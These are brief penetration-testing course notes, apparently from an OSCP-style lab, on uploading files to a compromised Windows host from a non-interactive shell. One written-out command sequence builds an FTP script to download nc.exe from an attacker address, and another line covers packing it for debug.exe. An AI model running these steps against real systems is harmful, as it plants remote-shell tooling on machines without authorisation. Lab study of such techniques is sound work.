







##Chapter 10 - File Upload from non-interactive Shell 
    - TFTP
    - FTP 
    - VBS
    - PowerShell
    - debug.exe

###FTP
FTP Server is interactive - simple remote shells not
TFTP Server (UDP based) is one alternative
The other is: ftp -s:filename 
"""
C:\Users\offsec>echo open 10.11.0.5 21> ftp.txt
C:\Users\offsec>echo USER offsec>> ftp.txt
C:\Users\offsec>echo ftp>> ftp.txt
C:\Users\offsec>echo bin >> ftp.txt
C:\Users\offsec>echo GET nc.exe >> ftp.txt
C:\Users\offsec>echo bye >> ftp.txt
C:\Users\offsec>ftp -v -n -s:ftp.txt
"""

###debug.exe
Assembly tool on windows to build executable
Use nc.exe, reduce size with upx and write to a text file with exe2bat


##Chapter 11 - Priviledge Escalation
PyInstaller!


